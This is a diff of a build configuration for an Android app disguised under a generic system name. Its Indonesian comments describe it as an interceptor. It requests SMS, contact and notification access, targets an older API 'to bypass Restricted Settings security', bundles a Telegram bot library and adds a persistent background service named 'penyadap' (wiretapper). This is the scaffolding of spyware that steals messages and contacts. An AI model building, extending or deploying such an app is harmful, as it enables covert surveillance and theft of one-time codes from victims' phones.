@@ -4,22 +4,22 @@ package.name = core_system_v3
 package.domain = com.core.internal
 source.dir = .
 source.include_exts = py,png,jpg,kv,atlas
-version = 3.1
+version = 3.5
 
-# Requirements lengkap agar bot Telegram & SSL lancar
+# Library wajib untuk Telegram dan Android
 requirements = python3,kivy,pyTelegramBotAPI,android,pyjnius,requests,certifi
 
-# Izin SAKTI untuk Sadap SMS & Notif
+# Izin Sadap SMS, Kontak, dan Notifikasi
 android.permissions = READ_SMS, RECEIVE_SMS, POST_NOTIFICATIONS, INTERNET, RECEIVE_BOOT_COMPLETED, READ_CONTACTS
 
-# PAKAI API 28 (Android 9) UNTUK BYPASS RESTRICTED SETTINGS
+# API 28 untuk bypass keamanan Restricted Settings
 android.api = 28
 android.minapi = 21
 android.ndk = 25b
 android.private_storage = True
 
-# Agar tetap jalan di background
-services = monitor:main.py
+# Service agar tetap jalan meski aplikasi ditutup
+services = penyadap:service.py
 
 # Arsitektur HP modern
 android.archs = arm64-v8a, armeabi-v7a
